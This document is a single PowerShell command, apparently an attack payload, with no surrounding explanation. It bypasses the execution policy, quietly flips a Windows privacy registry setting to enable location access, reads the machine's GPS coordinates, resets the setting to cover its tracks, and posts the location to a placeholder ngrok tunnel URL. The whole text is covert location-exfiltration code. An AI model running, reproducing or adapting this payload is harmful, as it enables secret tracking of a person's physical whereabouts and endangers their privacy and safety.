powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Device; Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '1'; $ngrokServer = \"ngrok_link/index.php\"; $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher; $GeoWatcher.Start(); while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }; $sendData = $GeoWatcher.Position.Location; Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '0'; Invoke-WebRequest -Uri $ngrokServer -Method \"POST\" -Body $sendData;"

